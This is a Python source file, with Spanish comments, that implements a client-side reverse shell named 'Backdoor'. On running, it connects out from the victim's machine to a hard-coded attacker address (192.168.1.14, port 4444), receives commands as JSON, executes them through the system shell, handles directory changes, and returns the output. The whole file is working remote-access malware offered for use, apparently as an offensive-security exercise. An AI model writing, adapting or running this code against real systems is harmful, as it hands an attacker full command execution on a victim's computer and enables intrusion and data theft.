import socket
import subprocess
import json
import os

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((bytes(ip, 'utf-8'), port)) #La víctima establece conexión con la computadora atacante

    #Codificación json:
    def reliableSend(self, data):
        if isinstance(data, bytes):
            jsonData = json.dumps(data.decode('utf-8', 'replace'))            
        else:
            jsonData = json.dumps(data)

        self.connection.send(bytes(jsonData, 'utf-8'))

    #Decodificación json:
    def reliableRecieve(self):
        jsonData = ''
        '''
        Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
        De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
        Así aseguramos la integridad de los mismos.
        '''
        while True:
            try:
                jsonData = self.connection.recv(1024)
                return json.loads(jsonData.decode('utf-8'))
            
            except ValueError: continue
    
    def runCommand(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return 'Comado no reconocido o error en el valor de salida'

    def changeDirectory(self, path):
        os.chdir(path)
        return f'[+] Cambiando a {path}'
    
    def run(self):
        try:
            while True: #Permite al programa ejecutarse indefinidamente
                command = self.reliableRecieve() #Recibe toda la información que le enviemos(En este caso, comandos de consola)
                if command[0] == 'salir' or command[0] == 'Salir':
                    self.connection.close()
                    exit()

                elif command[0] == 'cd' and len(command) > 1:
                    commandResults = self.changeDirectory(command[1])

                else: commandResults = self.runCommand(command)
                self.reliableSend(commandResults)

        except KeyboardInterrupt:
            self.reliableSend(b'El cliente ha finalizado la conexion')
            self.connection.close()
            print('\nConexión finalizada')


backdoor = Backdoor('192.168.1.14', 4444)
backdoor.run()
